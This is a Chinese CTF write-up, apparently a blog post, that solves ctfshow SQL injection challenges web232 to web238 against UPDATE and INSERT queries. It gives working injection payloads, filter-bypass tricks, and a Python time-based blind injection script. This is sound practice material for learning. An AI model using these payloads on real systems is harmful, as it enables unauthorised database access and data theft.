&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250902233929758.png&#34; alt=&#34;image-20250902233929758&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web232&#34;&gt;&lt;a href=&#34;#web232&#34; class=&#34;headerlink&#34; title=&#34;web232&#34;&gt;&lt;/a&gt;web232&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;update注入


查询语句
  //分页查询
  $sql = &amp;quot;update ctfshow_user set pass = md5(&amp;#39;&amp;#123;$password&amp;#125;&amp;#39;) where username = &amp;#39;&amp;#123;$username&amp;#125;&amp;#39;;&amp;quot;;


返回逻辑
  //无过滤
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;使用 &lt;code&gt;)&lt;/code&gt; 闭合 &lt;code&gt;MD5&lt;/code&gt; 函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;password=1&amp;#39;),username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;amp;username=1
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903001248218.png&#34; alt=&#34;image-20250903001248218&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903001158964.png&#34; alt=&#34;image-20250903001158964&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;password=1&amp;#39;),username=(select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;flagaa&amp;#39;)#&amp;amp;username=1
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903001442039.png&#34; alt=&#34;image-20250903001442039&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903001419909.png&#34; alt=&#34;image-20250903001419909&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;password=1&amp;#39;),username=(select flagass from ctfshow_web.flagaa) where 1=1#&amp;amp;username=1
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903001532039.png&#34; alt=&#34;image-20250903001532039&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903001512925.png&#34; alt=&#34;image-20250903001512925&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web233&#34;&gt;&lt;a href=&#34;#web233&#34; class=&#34;headerlink&#34; title=&#34;web233&#34;&gt;&lt;/a&gt;web233&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;update注入


查询语句
  //分页查询
  $sql = &amp;quot;update ctfshow_user set pass = &amp;#39;&amp;#123;$password&amp;#125;&amp;#39; where username = &amp;#39;&amp;#123;$username&amp;#125;&amp;#39;;&amp;quot;;


返回逻辑
  //无过滤
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;使用布尔盲注&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903003050589.png&#34; alt=&#34;image-20250903003050589&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests

url = &amp;quot;http://5407b3be-41c1-49b3-bde9-c7e2b000b3bf.challenge.ctf.show/api/&amp;quot;

#payload = &amp;quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&amp;quot;

#payload = &amp;quot;select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;flag233333&amp;#39;&amp;quot;

payload = &amp;quot;select flagass233 from flag233333&amp;quot;
flag = &amp;quot;&amp;quot;
i=0


while True:
    i=i+1
    start=32
    end=127
    while start&amp;lt;end:
        mid=(start+end)&amp;gt;&amp;gt;1
        data=&amp;#123;
            &amp;#39;username&amp;#39;:f&amp;quot;1&amp;#39; or if(ascii(substr((&amp;#123;payload&amp;#125;),&amp;#123;i&amp;#125;,1))&amp;gt;&amp;#123;mid&amp;#125;,sleep(0.1),1)#&amp;quot;,
            &amp;#39;password&amp;#39;:&amp;#39;1&amp;#39;
        &amp;#125;
        try:
            r=requests.post(url,data=data,timeout=2)
            end=mid
        except Exception as e:
            start=mid+1
    if start!=32:
        flag=flag+chr(start)
    else:
        break
    print(flag)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web234&#34;&gt;&lt;a href=&#34;#web234&#34; class=&#34;headerlink&#34; title=&#34;web234&#34;&gt;&lt;/a&gt;web234&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;update注入


查询语句
  //分页查询
  $sql = &amp;quot;update ctfshow_user set pass = &amp;#39;&amp;#123;$password&amp;#125;&amp;#39; where username = &amp;#39;&amp;#123;$username&amp;#125;&amp;#39;;&amp;quot;;


返回逻辑
  //无过滤
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;这一题过滤了单引号 &lt;code&gt;‘&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用 &lt;code&gt;\&amp;#39;&lt;/code&gt; 将会转义成普通字符，因此 &lt;code&gt;password&lt;/code&gt; 传入 &lt;code&gt;\&lt;/code&gt; 即可&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;这样，&lt;code&gt;pass=&amp;#39; where username =&lt;/code&gt;，再传入 &lt;code&gt;username&lt;/code&gt; 进行注入，末尾多余的 &lt;code&gt;‘&lt;/code&gt; 注释处理即可&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;password=\&amp;amp;username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903123928913.png&#34; alt=&#34;image-20250903123928913&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903123845602.png&#34; alt=&#34;image-20250903123845602&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;由于过滤了单引号，表名转换成十六进制形式表示&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;password=\&amp;amp;username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)#
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903124225466.png&#34; alt=&#34;image-20250903124225466&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903124201867.png&#34; alt=&#34;image-20250903124201867&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;password=\&amp;amp;username=,username=(select flagass23s3 from flag23a)#
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903124325723.png&#34; alt=&#34;image-20250903124325723&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903124310999.png&#34; alt=&#34;image-20250903124310999&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web235&#34;&gt;&lt;a href=&#34;#web235&#34; class=&#34;headerlink&#34; title=&#34;web235&#34;&gt;&lt;/a&gt;web235&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;update注入


查询语句
  //分页查询
  $sql = &amp;quot;update ctfshow_user set pass = &amp;#39;&amp;#123;$password&amp;#125;&amp;#39; where username = &amp;#39;&amp;#123;$username&amp;#125;&amp;#39;;&amp;quot;;


返回逻辑
  //过滤 or &amp;#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;过滤了 &lt;code&gt;or&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;information&lt;/code&gt; 字符串包含 &lt;code&gt;or&lt;/code&gt; ，因此不能使用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;mysql.innodb_table_stats&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是 InnoDB 引擎维护的一个系统表，存储 &lt;strong&gt;每个表的统计信息&lt;/strong&gt;。&lt;br&gt;常见字段：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;database_name&lt;/code&gt; → 数据库名&lt;/li&gt;
&lt;li&gt;&lt;code&gt;table_name&lt;/code&gt; → 表名&lt;/li&gt;
&lt;li&gt;&lt;code&gt;last_update&lt;/code&gt; → 最后更新时间&lt;/li&gt;
&lt;li&gt;&lt;code&gt;n_rows&lt;/code&gt; → 估算的行数&lt;/li&gt;
&lt;li&gt;&lt;code&gt;clustered_index_size&lt;/code&gt; → 聚簇索引页数&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sum_of_other_index_sizes&lt;/code&gt; → 其他索引大小&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;password=\&amp;amp;username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903130026552.png&#34; alt=&#34;image-20250903130026552&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903130047142.png&#34; alt=&#34;image-20250903130047142&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;password=\&amp;amp;username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;select b from ( ... ) a&lt;/code&gt; ：子查询，取别名 &lt;code&gt;a&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;在mysql里，要在 &lt;code&gt;from (子查询)&lt;/code&gt; 里面再取数据，必须给子查询一个别名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;select 1,2 as b,3&lt;/code&gt; 构造一条三列结果集：第一列 &amp;#x3D; 1，第二列 &amp;#x3D; 2（起别名 b），第三列 &amp;#x3D; 3&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;union select * from flag23a1 limit 1,1&lt;/code&gt;：取 &lt;code&gt;flag23a1&lt;/code&gt; 里的第 2 行&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903131112364.png&#34; alt=&#34;image-20250903131112364&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903131053372.png&#34; alt=&#34;image-20250903131053372&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web236&#34;&gt;&lt;a href=&#34;#web236&#34; class=&#34;headerlink&#34; title=&#34;web236&#34;&gt;&lt;/a&gt;web236&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;update注入


查询语句
  //分页查询
  $sql = &amp;quot;update ctfshow_user set pass = &amp;#39;&amp;#123;$password&amp;#125;&amp;#39; where username = &amp;#39;&amp;#123;$username&amp;#125;&amp;#39;;&amp;quot;;


返回逻辑
  //过滤 or &amp;#39; flag
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;这一题过滤的 &lt;code&gt;flag&lt;/code&gt; ，考察的应该是对查询结果返回的过滤，但是flag的格式为 &lt;code&gt;ctfshow&amp;#123;&amp;#125;&lt;/code&gt; ，并无影响&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;password=\&amp;amp;username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903132600718.png&#34; alt=&#34;image-20250903132600718&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903131813142.png&#34; alt=&#34;image-20250903131813142&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;base64转码&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;password=\&amp;amp;username=,username=(select to_base64(b) from (select 1,2 as b,3 union select * from flaga limit 1,1)a)#

//实际上不使用base64处理也能回显flag
password=\&amp;amp;username=,username=(select b from (select 1,2 as b,3 union select * from flaga limit 1,1)a)#
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903132838560.png&#34; alt=&#34;image-20250903132838560&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903132733347.png&#34; alt=&#34;image-20250903132733347&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;img data-src=&#34;\images\article_images\image-20250903133014018.png&#34; alt=&#34;image-20250903133014018&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web237&#34;&gt;&lt;a href=&#34;#web237&#34; class=&#34;headerlink&#34; title=&#34;web237&#34;&gt;&lt;/a&gt;web237&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;insert注入


查询语句
  //插入数据
  $sql = &amp;quot;insert into ctfshow_user(username,pass) value(&amp;#39;&amp;#123;$username&amp;#125;&amp;#39;,&amp;#39;&amp;#123;$password&amp;#125;&amp;#39;);&amp;quot;;


返回逻辑
  //无过滤
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;username=1&amp;#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()));#

password=1
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903134316880.png&#34; alt=&#34;image-20250903134316880&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903134340764.png&#34; alt=&#34;image-20250903134340764&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;username=1&amp;#39;,(select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;flag&amp;#39;));#

password=1
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903134419813.png&#34; alt=&#34;image-20250903134419813&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903134441594.png&#34; alt=&#34;image-20250903134441594&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;username=1&amp;#39;,(select flagass23s3 from flag limit 0,1));#

password=1
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903134528266.png&#34; alt=&#34;image-20250903134528266&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903134543664.png&#34; alt=&#34;image-20250903134543664&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web238&#34;&gt;&lt;a href=&#34;#web238&#34; class=&#34;headerlink&#34; title=&#34;web238&#34;&gt;&lt;/a&gt;web238&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;insert注入


查询语句
  //插入数据
  $sql = &amp;quot;insert into ctfshow_user(username,pass) value(&amp;#39;&amp;#123;$username&amp;#125;&amp;#39;,&amp;#39;&amp;#123;$password&amp;#125;&amp;#39;);&amp;quot;;


返回逻辑
  //过滤空格
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;过滤了空格，且经过测试，使用带 &lt;code&gt;*&lt;/code&gt; 的payload无法实现成功注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;username=1&amp;#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#

password=1
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903135936598.png&#34; alt=&#34;image-20250903135936598&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903140004126.png&#34; alt=&#34;image-20250903140004126&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;username=1&amp;#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&amp;#39;flagb&amp;#39;)));#

password=1
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903140136801.png&#34; alt=&#34;image-20250903140136801&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903140158434.png&#34; alt=&#34;image-20250903140158434&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;username=1&amp;#39;,(select(flag)from(flagb)));#

password=1
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903140338333.png&#34; alt=&#34;image-20250903140338333&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250903140359738.png&#34; alt=&#34;image-20250903140359738&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;hr&gt;
